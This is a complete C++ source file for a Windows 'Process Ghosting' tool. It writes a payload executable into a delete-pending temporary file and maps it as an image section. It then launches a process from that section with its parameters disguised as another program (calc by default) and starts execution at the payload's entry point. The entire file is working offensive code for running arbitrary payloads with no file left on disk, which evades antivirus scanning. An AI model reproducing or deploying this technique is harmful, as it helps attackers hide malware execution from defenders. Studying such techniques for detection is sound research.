#include <Windows.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "process_env.h"
#pragma comment(lib, "Ntdll.lib")

HANDLE open_file(wchar_t* filePath)
{
    // convert to NT path
    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);

    UNICODE_STRING file_name = { 0 };
    RtlInitUnicodeString(&file_name, nt_path.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK status_block = { 0 };
    HANDLE file = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(&file, 
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr, 
        &status_block, 
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::wcout << "[+] Created temp file: " << filePath << "\n";
    return file;
}

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HANDLE hDelFile = open_file(filePath);
    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create file" << std::dec << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK status_block = { 0 };

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        std::cout << "Setting information failed: " << std::hex << status << "\n";
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[+] Information set\n";

    LARGE_INTEGER ByteOffset = { 0 };

    status = NtWriteFile(
        hDelFile,
        NULL,
        NULL,
        NULL, 
        &status_block,
        payladBuf, 
        payloadSize,
        &ByteOffset,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        DWORD err = GetLastError();
        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    std::cout << "[+] Written!\n";

    HANDLE hSection = nullptr;
    status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    NtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}

bool process_ghost(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);
    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
    DWORD payload_ep = get_entry_point_rva(payladBuf);
    ULONGLONG procEntry =  payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    std::cout << "[+] Process created! Pid = " << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2) {
        std::cout << "Process Ghosting (";
        if (is32bit) std::cout << "32bit";
        else std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n" << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t *targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
    }
    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
    if (payladBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    bool is_ok = process_ghost(targetPath, payladBuf, (DWORD) payloadSize);

    free_buffer(payladBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
